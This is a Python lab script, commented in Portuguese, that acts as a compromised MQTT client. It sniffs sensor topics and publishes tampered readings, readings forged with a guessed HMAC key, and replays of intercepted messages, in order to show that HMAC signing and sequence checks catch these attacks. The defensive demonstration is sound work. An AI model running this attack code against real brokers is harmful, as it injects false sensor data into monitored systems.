import hashlib
import hmac
import json
import os
import random
import ssl
import threading
from collections import deque

import paho.mqtt.client as mqtt

# Agente malicioso de laboratório: possui credenciais MQTT válidas e uma ACL
# deliberadamente ampla (sensors/#, leitura e escrita) para simular um
# cliente comprometido com acesso total ao broker. O objetivo é demonstrar
# que, mesmo com TLS, usuário/senha e ACL todos corretos, um atacante ainda
# não consegue forjar dados sem conhecer a chave HMAC compartilhada entre os
# dispositivos e o subscriber - e que o próprio HMAC não impede repetição
# (replay) de uma mensagem legítima, o que o subscriber trata separadamente.
MQTT_HOST = os.environ["MQTT_HOST"]
MQTT_PORT = int(os.environ.get("MQTT_PORT", "8883"))
MQTT_USER = os.environ["MQTT_USER"]
MQTT_PASSWORD = os.environ["MQTT_PASSWORD"]
SNIFF_TOPIC = os.environ.get("ATTACKER_SNIFF_TOPIC", "sensors/#")
REPLAY_DELAY_SECONDS = float(os.environ.get("ATTACKER_REPLAY_DELAY_SECONDS", "3"))
CONTROL_TOPIC = os.environ.get("ATTACKER_CONTROL_TOPIC", "control/attacker")
STATUS_TOPIC = CONTROL_TOPIC + "/status"

CA_CERT_PATH = "/certs/ca.crt"

# Começa inativo: só passa a atacar quando o dashboard publica em CONTROL_TOPIC.
_active_lock = threading.Lock()
active = False

# O atacante NUNCA recebe a chave HMAC real - usa uma chave própria, gerada
# aleatoriamente, para simular uma tentativa de forjar assinaturas sem
# conhecer o segredo verdadeiro.
FAKE_HMAC_KEY = os.urandom(32)

MAX_SEEN = 2000
_seen_lock = threading.Lock()
_seen_set = set()
_seen_order = deque()


def remember(raw: bytes) -> bool:
    """Marca um payload como já tratado. Retorna True se já havia sido visto."""
    with _seen_lock:
        if raw in _seen_set:
            return True
        _seen_set.add(raw)
        _seen_order.append(raw)
        if len(_seen_order) > MAX_SEEN:
            oldest = _seen_order.popleft()
            _seen_set.discard(oldest)
        return False


def fake_sign(device: str, seq, temp: str) -> str:
    message = f"{device}|{seq}|{temp}".encode()
    return hmac.new(FAKE_HMAC_KEY, message, hashlib.sha256).hexdigest()


def publish_status(client):
    with _active_lock:
        a = active
    client.publish(STATUS_TOPIC, json.dumps({"active": a}), qos=1, retain=True)


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"[ATACANTE] conectado - interceptando '{SNIFF_TOPIC}' (aguardando ativação)", flush=True)
        client.subscribe(SNIFF_TOPIC)
        client.subscribe(CONTROL_TOPIC)
        publish_status(client)
    else:
        print(f"[ATACANTE] falha ao conectar, rc={rc}", flush=True)


def on_message(client, userdata, msg):
    global active

    if msg.topic == CONTROL_TOPIC:
        try:
            cmd = json.loads(msg.payload.decode())
        except (UnicodeDecodeError, json.JSONDecodeError):
            return
        with _active_lock:
            active = bool(cmd.get("active", False))
            now = active
        print(f"[CONTROLE] atacante {'ATIVADO' if now else 'desativado'}", flush=True)
        publish_status(client)
        return

    with _active_lock:
        if not active:
            return

    raw = msg.payload

    try:
        data = json.loads(raw.decode())
    except (UnicodeDecodeError, json.JSONDecodeError):
        return

    # Ignora o eco dos próprios ataques (tamper/forjado) para não entrar
    # em loop atacando infinitamente o que ele mesmo publicou.
    if data.get("x_attacker"):
        return

    # Ignora o eco do próprio replay (mesmo payload, já tratado antes).
    if remember(raw):
        return

    device = data.get("device")
    seq = data.get("seq")
    temp = data.get("temp")
    print(f"[INTERCEPTADA] topic={msg.topic} device={device} seq={seq} temp={temp}", flush=True)

    if device is None or seq is None or temp is None:
        return

    # Ataque 1 - adulteração em trânsito (bit-flipping / MITM):
    # altera o valor interceptado mas mantém o HMAC original, que não bate
    # mais com o novo conteúdo.
    tampered_temp = f"{float(temp) + 50:.2f}"
    tampered_payload = dict(data)
    tampered_payload["temp"] = tampered_temp
    tampered_payload["x_attacker"] = "tamper"
    client.publish(msg.topic, json.dumps(tampered_payload))
    print(
        f"[ATAQUE tamper] {msg.topic}: temp {temp} -> {tampered_temp} "
        "(HMAC original mantido, não confere mais)",
        flush=True,
    )

    # Ataque 2 - forjar uma leitura nova para o mesmo dispositivo, assinada
    # com uma chave "chutada" (o atacante não tem a chave real).
    forged_seq = int(seq) + 1_000_000
    forged_temp = f"{random.uniform(80, 120):.2f}"
    forged_payload = {
        "device": device,
        "seq": forged_seq,
        "temp": forged_temp,
        "hmac": fake_sign(device, forged_seq, forged_temp),
        "x_attacker": "forged",
    }
    client.publish(msg.topic, json.dumps(forged_payload))
    print(
        f"[ATAQUE forjar] {msg.topic}: leitura falsa device={device} "
        f"seq={forged_seq} temp={forged_temp} (assinada com chave chutada)",
        flush=True,
    )

    # Ataque 3 - replay: reenvia o payload original, byte a byte, sem
    # alterar nada. O HMAC continua válido - só uma defesa extra baseada em
    # número de sequência (implementada no subscriber) detecta isso.
    timer = threading.Timer(
        REPLAY_DELAY_SECONDS,
        lambda: (
            client.publish(msg.topic, raw),
            print(f"[ATAQUE replay] {msg.topic}: reenviando payload original intacto", flush=True),
        ),
    )
    timer.daemon = True
    timer.start()


def main():
    client = mqtt.Client()
    client.username_pw_set(MQTT_USER, MQTT_PASSWORD)
    client.tls_set(ca_certs=CA_CERT_PATH, tls_version=ssl.PROTOCOL_TLS_CLIENT)
    client.on_connect = on_connect
    client.on_message = on_message

    client.connect(MQTT_HOST, MQTT_PORT, keepalive=60)
    client.loop_forever()


if __name__ == "__main__":
    main()
